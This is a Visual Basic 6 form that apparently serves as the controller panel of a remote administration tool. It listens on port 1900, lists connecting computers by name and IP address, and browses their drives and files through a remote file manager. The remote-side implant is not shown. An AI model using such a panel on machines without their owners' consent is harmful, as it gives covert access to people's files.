VERSION 5.00
Object = "{6B7E6392-850A-101B-AFC0-4210102A8DA7}#1.3#0"; "COMCTL32.OCX"
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Begin VB.Form FrmMain 
   BorderStyle     =   3  'Fixed Dialog
   Caption         =   "Client"
   ClientHeight    =   3090
   ClientLeft      =   45
   ClientTop       =   435
   ClientWidth     =   9165
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   3090
   ScaleWidth      =   9165
   StartUpPosition =   2  'CenterScreen
   Begin MSWinsockLib.Winsock Client 
      Index           =   0
      Left            =   120
      Top             =   840
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin ComctlLib.ListView LstSIN 
      Height          =   3015
      Left            =   0
      TabIndex        =   0
      Top             =   0
      Width           =   9135
      _ExtentX        =   16113
      _ExtentY        =   5318
      View            =   3
      MultiSelect     =   -1  'True
      LabelWrap       =   -1  'True
      HideSelection   =   -1  'True
      _Version        =   327682
      ForeColor       =   -2147483640
      BackColor       =   -2147483643
      Appearance      =   1
      NumItems        =   3
      BeginProperty ColumnHeader(1) {0713E8C7-850A-101B-AFC0-4210102A8DA7} 
         Key             =   ""
         Object.Tag             =   ""
         Text            =   "WAN / LAN"
         Object.Width           =   6068
      EndProperty
      BeginProperty ColumnHeader(2) {0713E8C7-850A-101B-AFC0-4210102A8DA7} 
         SubItemIndex    =   1
         Key             =   ""
         Object.Tag             =   ""
         Text            =   "Index"
         Object.Width           =   0
      EndProperty
      BeginProperty ColumnHeader(3) {0713E8C7-850A-101B-AFC0-4210102A8DA7} 
         SubItemIndex    =   2
         Key             =   ""
         Object.Tag             =   ""
         Text            =   "Computer"
         Object.Width           =   4304
      EndProperty
   End
End
Attribute VB_Name = "FrmMain"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Dim Stringz As String
Dim Lawls() As String
Dim Lawl() As String
Dim Hrins() As String
Dim lFilesSize As Long
Dim X As Integer
Dim i As Long

Private Sub Client_Close(Index As Integer)
For X = 1 To LstSIN.ListItems.Count
If LstSIN.ListItems.Item(X).SubItems(1) = Index Then
LstSIN.ListItems.Remove (LstSIN.ListItems.Item(X).Index)
Exit Sub
End If
Next X
End Sub


Private Sub Form_Load()
SendMessageA LstSIN.hWnd, &H1000 + 54, &H1, ByVal 1
SendMessageA LstSIN.hWnd, &H1000 + 54, &H20, ByVal True

''On Error Resume Next
Client(Index).Close
Client(Index).LocalPort = 1900
Client(Index).Listen
End Sub

Private Sub Form_Unload(Cancel As Integer)
End
End Sub

Private Sub lstsin_DblClick()
FrmManager.Show
Client(LstSIN.SelectedItem.SubItems(1)).SendData "300100"
FrmMain.Hide
End Sub

Private Sub Client_ConnectionRequest(Index As Integer, ByVal requestID As Long)
Dim NumSock As Integer
Dim NumElem As Integer
Dim i As Integer
NumElem = Client.UBound
For i = 1 To NumElem
If Client(i).State <> 7 Then
NumSock = i
Client(NumSock).Close
Client(NumSock).Accept requestID
Exit Sub
End If
Next
Load Client(NumElem + 1)
NumSock = Client.UBound
Client(NumSock).Accept requestID
End Sub

Private Sub Client_DataArrival(Index As Integer, ByVal bytesTotal As Long)
'On Error Resume Next
Dim SData As String
Dim All_Data As String
Dim Multi() As String
Dim Command As String

Client(Index).GetData SData
Debug.Print SData

Command = Left(SData, 6)
All_Data = Right(SData, Len(SData) - 6)
Multi() = Split(All_Data, "\?/")

Select Case Command
Case "Srtlab"
With LstSIN.ListItems.Add(, , Multi(1) & " - " & Client(Index).RemoteHostIP)
.SubItems(1) = Index
.SubItems(2) = Multi(2)
End With

Case "WachtW": Client(Index).SendData "Srtlab"
'**********************
'*FILE MANAGER
'**************
Case "300100"
Dim Param() As String

FrmManager.Tvfolders.Nodes.Clear
Multi() = Split(All_Data, Chr(35))

For X = LBound(Multi) To UBound(Multi) - 1
Param = Split(Multi(X), Chr(45))
SKeys = SKeys & Param(0) & Chr(1)

Alles = Alles & Param(0) & " - " & Drivers(Param(1), Param(0)) & ", Free " & Param(2) & "/" & Param(3) & ")" & Chr(1)
Set xnode = FrmManager.Tvfolders.Nodes.Add(, , Param(0), Param(0) & " - " & Drivers(Param(1), Param(0)) & ", Free " & Param(2) & "/" & Param(3) & ")", DriveIcon(Drivers(Param(1), Param(0))))
Next
FrmManager.lstFiles.Enabled = True


Case "STRFLS"
FrmManager.lstFiles.ListItems.Clear
Lawl() = Split(All_Data, "///")
Stringz = Stringz & Lawl(1)
Client(Index).SendData "STRFL2" '

Case "STRFL2"
Lawls() = Split(All_Data, "///")
Stringz = Stringz & Lawls(1)
Multi() = Split(Stringz, "|||")
For X = 1 To UBound(Multi())
Hrins() = Split(Multi(X), "###")
On Error Resume Next
lFilesSize = lFilesSize + Hrins(1)

If Hrins(1) = "" Then
If tEst = True Then FrmManager.Tvfolders.Nodes.Add Splaats, tvwChild, Hrins(0), Hrins(0), 6
If tEst = False Then FrmManager.Tvfolders.Nodes.Add FrmManager.Tvfolders.SelectedItem.Key, tvwChild, Hrins(0), Hrins(0), 6
Else
On Error Resume Next
SetIcon Hrins(0), Hrins(1)

'*********************************************************
End If
Next X
Stringz = ""
FrmManager.sbFiles.Panels(2).Text = "Files Received"
FrmManager.lstFiles.Enabled = True
FrmManager.Tvfolders.Enabled = True
FrmManager.Tvfolders.SelectedItem.Expanded = True
FrmManager.sbFiles.Panels(3).Text = FormatKB(lFilesSize) & " In " & FrmManager.lstFiles.ListItems.Count & " Objects"
lFilesSize = 0

End Select
End Sub
